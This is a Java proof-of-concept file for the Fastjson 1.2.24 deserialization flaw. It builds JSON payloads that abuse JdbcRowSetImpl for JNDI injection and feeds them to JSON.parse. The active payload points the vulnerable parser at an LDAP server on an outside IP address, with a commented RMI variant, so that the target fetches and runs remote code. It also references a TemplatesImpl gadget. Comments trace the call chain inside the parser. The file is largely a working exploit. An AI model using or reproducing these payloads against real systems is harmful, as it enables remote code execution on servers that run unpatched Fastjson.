import com.alibaba.fastjson.JSON;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

import static templatesimpl.TemplatesImplPoc.templatesImpl;


public class FastJson1_LE1224 {
    /**
     * JSON.parseObject(poc2);
     *  JSON.parse(String text)
     *   JSON.parse(String text, int features)
     *    DefaultJSONParser.parse()
     *     DefaultJSONParser.parse(Object fieldName)
     *      case LBRACE
     *      DefaultJSONParser.parseObject(final Map object, Object fieldName)
     *       JavaBeanDeserializar.deserialze(DefaultJSONParser parser, Type type, Object fieldName)
     *        JavaBeanDeserializer.parseRest(DefaultJSONParser parser, Type type, Object fieldName, Object instance, int features)
     *         JavaBeanDeserializer.deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features)
     *          JavaBeanDeserializer.parseField(DefaultJSONParser parser, String key, Object object, Type objectType, Map<String, Object> fieldValues)
     *          FieldDeserializer.parseField(DefaultJSONParser parser, Object object, Type objectType, Map<String, Object> fieldValues)
     *           FieldDeserializer.setValue(Object object, Object value)
     *            method.invoke(object, value)
     */
    public static String jdbcRowSetImpl() {
        /**
         * com.sun.rowset.JdbcRowSetImpl.setAutoCommit()
         *  com.sun.rowset.JdbcRowSetImpl.connect()
         *   var1.lookup(this.getDataSourceName());
         */
        // 这里之所以是dataSourceName而不是dataSource 是因为 fastjson会调用setter, 进而调用setDataSourceName 来设置dataSource
        // 而且dataSourceName和autoCommit的顺序不能变, 这是因为setter调用顺序原因

        // 如下poc需要本地启用RMIServer
        // String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/refObj\", \"autoCommit\":true}";

//         下面两个poc分别在远端开启rmi和ldap服务即可使用
//         String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://47.95.7.37:1099/Calc\", \"autoCommit\":true}";
        String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://47.95.7.37:1389/Calc\", \"autoCommit\":true}";

        /**
         * 下面三种任选一种
         * JSON.parse(PoC);
         * JSON.parseObject(PoC);
         * JSONObject.parse(PoC);
         */
        return poc;
    }


    public static void main(String[] args) throws Exception {
        String poc = templatesImpl();
//        JSON.parseObject(poc, Feature.SupportNonPublicField);
//        JSON.parse(poc, Feature.SupportNonPublicField);
//        JSON.parseObject(poc, Object.class, Feature.SupportNonPublicField);

        String poc2 = jdbcRowSetImpl();
        JSON.parse(poc2);
//        JSON.parseObject(poc2);
//        JSONObject.parse(poc2);
    }
}
